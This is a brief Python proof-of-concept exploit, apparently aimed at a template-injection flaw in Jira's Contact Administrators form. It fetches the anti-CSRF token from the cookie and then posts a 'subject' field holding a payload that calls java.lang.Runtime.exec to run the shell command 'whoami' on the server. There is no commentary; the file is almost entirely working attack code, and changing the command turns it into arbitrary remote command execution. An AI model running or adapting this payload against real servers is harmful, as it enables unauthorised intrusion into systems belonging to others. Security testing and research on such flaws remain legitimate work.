# -*- coding: utf-8 -*-
import requests

req = requests.Session()

def Poc(url):
    print("[+] Get Token")
    r = req.get("%s/secure/ContactAdministrators!default.jspa" % url)
    c = r.headers['Set-Cookie']
    t = c[c.find("=")+1:c.find(";")]
    data = {
        "from":"test@test.com",
        "subject":"$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()",
        "details":"v",
        "atl_token":t,
        "发送":"发送"
    }
    print("[+] Token : %s" % t)
    print("[+] Exploit")
    r = req.post("%s/secure/ContactAdministrators.jspa" % url, data=data, allow_redirects=False)
    print(r.status_code)

if __name__ == "__main__":
    Poc("http://localhost:8080")